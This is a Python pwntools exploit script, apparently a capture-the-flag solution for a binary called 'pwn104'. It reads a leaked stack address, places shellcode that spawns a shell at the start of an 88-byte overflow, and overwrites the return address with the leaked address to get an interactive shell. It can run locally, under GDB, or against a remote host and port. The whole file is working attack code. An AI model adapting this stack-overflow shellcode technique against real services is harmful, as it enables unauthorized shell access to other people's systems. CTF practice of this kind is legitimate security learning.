from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Binary filename
exe = './pwn104.pwn104'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

print(io.recvuntil("I'm waiting for you at"))
leak = io.recvline()
addr = int(leak.strip("\n"), 16)
print('Leaked input stack address ' + hex(addr))

offset = 88
shellcode = asm(shellcraft.sh())
padding = b'A' * (offset - len(shellcode))


# Build the payload
payload = flat([
    shellcode,
    padding,
    addr
])

# Send payload
io.sendline(payload)

# Got Shell?
io.interactive()